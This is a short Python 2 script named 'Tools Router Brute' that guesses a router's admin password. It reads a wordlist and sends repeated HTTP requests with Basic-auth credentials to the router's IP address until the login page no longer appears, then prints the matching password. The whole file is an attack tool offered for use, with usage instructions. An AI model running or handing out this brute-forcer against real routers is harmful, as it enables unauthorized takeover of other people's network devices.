#!/usr/bin/python
# TOOLS ROUTER BRUTE - V1.0.0
# Developement: Walderlan Sena <senawalderlan@gmail.com>
#

import requests as r
import base64
import sys
import os

def splash():

    print(
    """
        TOOLS ROUTER BRUTE - v1.0.0
        Site: https://www.github.com/WalderlanSena/toolsrouterbrute
        Developement: Walderlan Sena <senwalderlan@gmail.com>
    """
    )

if len(sys.argv) < 2:
    splash()
    print("\tUsage: ./trb.py user IPRouter wordlist\n")
    print("\tExample: ./trb.py admin 192.168.1.1 list.txt\n")
    exit(1)


os.system('setterm -cursor off')

def main():
    wordlist = open(sys.argv[3], 'r')
    count = 0
    for i in wordlist:

        login = str(sys.argv[1])
        password = i.rstrip()
        auth  = "Basic "

        authEncode = auth+base64.b64encode(login+':'+password)

        cookie = {"Authorization": authEncode}

        try:
            response = r.get('http://'+sys.argv[2], cookies=cookie)
        except:
            splash()
            print("\tError to connect: " + sys.argv[2])
            exit(1)

        if not response.content.count('id="userName"') != 1:
            splash()
            os.system('setterm -cursor on')
            print('\n\tPassword Found =====> ' + password)
            exit(0)

        os.system("clear")
        splash()
        count = count + 1
        print('\t[ '+ str(count) + ' ] Password not found ===> ' + password)

if __name__ == "__main__":

    try:
        main();
    except KeyboardInterrupt:
        os.system('setterm -cursor on')
        print("\nOperation canceled ! :(\n")
